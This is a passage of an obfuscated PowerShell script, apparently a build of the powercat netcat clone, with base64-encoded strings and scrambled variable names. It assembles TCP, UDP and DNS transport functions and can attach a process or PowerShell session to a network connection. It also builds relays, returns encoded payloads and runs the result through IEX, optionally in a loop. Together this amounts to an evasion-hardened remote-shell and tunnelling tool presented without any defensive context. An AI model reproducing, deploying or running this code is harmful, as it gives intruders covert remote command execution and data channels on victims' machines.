    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAIABTAHQAcgBlAGEAbQAgADEAOgAgAEQATgBTAA==')))
    ${_/\__/\___/\/\___} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgA='))) + ${function:Setup_DNS} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFIAZQBhAGQARABhAHQAYQAKAHsACgA='))) + ${function:ReadData_DNS} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFcAcgBpAHQAZQBEAGEAdABhAAoAewAKAA=='))) + ${function:WriteData_DNS} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAEMAbABvAHMAZQAKAHsACgA='))) + ${function:Close_DNS} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    if($l){return $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAGYAZQBhAHQAdQByAGUAIABpAHMAIABuAG8AdAAgAGEAdgBhAGkAbABhAGIAbABlAC4A')))}
    else{${__/\/==\_/=\/\/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGkAbgAgAEAAKAAnACQAYwAnACwAJwAkAHAAJwAsACcAJABkAG4AcwAnACwAJABkAG4AcwBmAHQAKQAgAA==')))}
  }
  else
  {
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAIABTAHQAcgBlAGEAbQAgADEAOgAgAFQAQwBQAA==')))
    ${_/\__/\___/\/\___} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgA='))) + ${function:Setup_TCP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFIAZQBhAGQARABhAHQAYQAKAHsACgA='))) + ${function:ReadData_TCP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFcAcgBpAHQAZQBEAGEAdABhAAoAewAKAA=='))) + ${function:WriteData_TCP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAEMAbABvAHMAZQAKAHsACgA='))) + ${function:Close_TCP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    if($l){${__/\/==\_/=\/\/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGkAbgAgAEAAKAAnACcALAAkAFQAcgB1AGUALAAkAHAALAAkAHQAKQAgAA==')))}
    else{${__/\/==\_/=\/\/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGkAbgAgAEAAKAAnACQAYwAnACwAJABGAGEAbABzAGUALAAkAHAALAAkAHQAKQAgAA==')))}
  }
  if($e -ne "")
  {
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAIABTAHQAcgBlAGEAbQAgADIAOgAgAFAAcgBvAGMAZQBzAHMA')))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFMAZQB0AHUAcAAKAHsACgA='))) + ${function:Setup_CMD} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFIAZQBhAGQARABhAHQAYQAKAHsACgA='))) + ${function:ReadData_CMD} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFcAcgBpAHQAZQBEAGEAdABhAAoAewAKAA=='))) + ${function:WriteData_CMD} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAEMAbABvAHMAZQAKAHsACgA='))) + ${function:Close_CMD} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${__/\/==\_/=\/\/\/} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QAAoACcAJABlACcAKQAKAAoA')))
  }
  elseif($ep)
  {
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAIABTAHQAcgBlAGEAbQAgADIAOgAgAFAAbwB3AGUAcgBzAGgAZQBsAGwA')))
    ${__/\/==\_/=\/\/\/} += "`n`n"
  }
  elseif($r -ne "")
  {
    if($r.split(":")[0].ToLower() -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBkAHAA'))))
    {
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAIABTAHQAcgBlAGEAbQAgADIAOgAgAFUARABQAA==')))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFMAZQB0AHUAcAAKAHsACgA='))) + ${function:Setup_UDP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFIAZQBhAGQARABhAHQAYQAKAHsACgA='))) + ${function:ReadData_UDP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFcAcgBpAHQAZQBEAGEAdABhAAoAewAKAA=='))) + ${function:WriteData_UDP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAEMAbABvAHMAZQAKAHsACgA='))) + ${function:Close_UDP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))    
      if($r.split(":").Count -eq 2){${__/\/==\_/=\/\/\/} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QAAoACcAJwAsACQAVAByAHUAZQAsACcA'))) + $r.split(":")[1] + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAsACcAJAB0ACcAKQAgAA=='))))}
      elseif($r.split(":").Count -eq 3){${__/\/==\_/=\/\/\/} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QAAoACcA'))) + $r.split(":")[1] + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAsACQARgBhAGwAcwBlACwAJwA='))) + $r.split(":")[2] + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAsACcAJAB0ACcAKQAgAA=='))))}
      else{return $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAGQAIAByAGUAbABhAHkAIABmAG8AcgBtAGEAdAAuAA==')))}
    }
    if($r.split(":")[0].ToLower() -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMA'))))
    {
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAIABTAHQAcgBlAGEAbQAgADIAOgAgAEQATgBTAA==')))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFMAZQB0AHUAcAAKAHsACgA='))) + ${function:Setup_DNS} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFIAZQBhAGQARABhAHQAYQAKAHsACgA='))) + ${function:ReadData_DNS} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFcAcgBpAHQAZQBEAGEAdABhAAoAewAKAA=='))) + ${function:WriteData_DNS} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAEMAbABvAHMAZQAKAHsACgA='))) + ${function:Close_DNS} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
      if($r.split(":").Count -eq 2){return $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAGYAZQBhAHQAdQByAGUAIABpAHMAIABuAG8AdAAgAGEAdgBhAGkAbABhAGIAbABlAC4A')))}
      elseif($r.split(":").Count -eq 4){${__/\/==\_/=\/\/\/} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QAAoACcA'))) + $r.split(":")[1] + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAsACcA'))) + $r.split(":")[2] + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAsACcA'))) + $r.split(":")[3] + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAsACQAZABuAHMAZgB0ACkAIAA='))))}
      else{return $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAGQAIAByAGUAbABhAHkAIABmAG8AcgBtAGEAdAAuAA==')))}
    }
    elseif($r.split(":")[0].ToLower() -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABjAHAA'))))
    {
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAIABTAHQAcgBlAGEAbQAgADIAOgAgAFQAQwBQAA==')))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFMAZQB0AHUAcAAKAHsACgA='))) + ${function:Setup_TCP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFIAZQBhAGQARABhAHQAYQAKAHsACgA='))) + ${function:ReadData_TCP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFcAcgBpAHQAZQBEAGEAdABhAAoAewAKAA=='))) + ${function:WriteData_TCP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
      ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAEMAbABvAHMAZQAKAHsACgA='))) + ${function:Close_TCP} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
      if($r.split(":").Count -eq 2){${__/\/==\_/=\/\/\/} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QAAoACcAJwAsACQAVAByAHUAZQAsACcA'))) + $r.split(":")[1] + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAsACcAJAB0ACcAKQAgAA=='))))}
      elseif($r.split(":").Count -eq 3){${__/\/==\_/=\/\/\/} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QAAoACcA'))) + $r.split(":")[1] + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAsACQARgBhAGwAcwBlACwAJwA='))) + $r.split(":")[2] + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAsACcAJAB0ACcAKQAgAA=='))))}
      else{return $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAGQAIAByAGUAbABhAHkAIABmAG8AcgBtAGEAdAAuAA==')))}
    }
  }
  else
  {
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAIABTAHQAcgBlAGEAbQAgADIAOgAgAEMAbwBuAHMAbwBsAGUA')))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFMAZQB0AHUAcAAKAHsACgA='))) + ${function:Setup_Console} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFIAZQBhAGQARABhAHQAYQAKAHsACgA='))) + ${function:ReadData_Console} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAFcAcgBpAHQAZQBEAGEAdABhAAoAewAKAA=='))) + ${function:WriteData_Console} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMgBfAEMAbABvAHMAZQAKAHsACgA='))) + ${function:Close_Console} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))
    ${__/\/==\_/=\/\/\/} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QAAoACcA'))) + $o + "')")
  }
  if($ep){${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAATQBhAGkAbgAKAHsACgA='))) + ${function:Main_Powershell} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))}
  else{${_/\__/\___/\/\___} += ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAATQBhAGkAbgAKAHsACgA='))) + ${function:Main} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgB9AAoACgA='))))}
  ${__/\/==\_/=\/\/\/} = (${_/\__/\___/\/\___} + ${__/\/==\_/=\/\/\/})
  if($ge){Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHQAdQByAG4AaQBuAGcAIABFAG4AYwBvAGQAZQBkACAAUABhAHkAbABvAGEAZAAuAC4ALgA='))) ; return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(${__/\/==\_/=\/\/\/}))}
  elseif($g){Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHQAdQByAG4AaQBuAGcAIABQAGEAeQBsAG8AYQBkAC4ALgAuAA=='))) ; return ${__/\/==\_/=\/\/\/}}
  ${/=\/==\/=\___/==\} = $null
  try
  {
    if($rep)
    {
      while($True)
      {
        ${/=\/==\/=\___/==\} += IEX ${__/\/==\_/=\/\/\/}
        sleep -s 2
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHAAZQB0AGkAdABpAG8AbgAgAEUAbgBhAGIAbABlAGQAOgAgAFIAZQBzAHQAYQByAHQAaQBuAGcALgAuAC4A')))
      }
    }
    else
    {
      ${/=\/==\/=\___/==\} += IEX ${__/\/==\_/=\/\/\/}
    }
  }
  finally
  {
    if(${/=\/==\/=\___/==\} -ne $null)
    {
      if($of -eq ""){${/=\/==\/=\___/==\}}
      else{[io.file]::WriteAllBytes($of,${/=\/==\/=\___/==\})}
    }
  }
}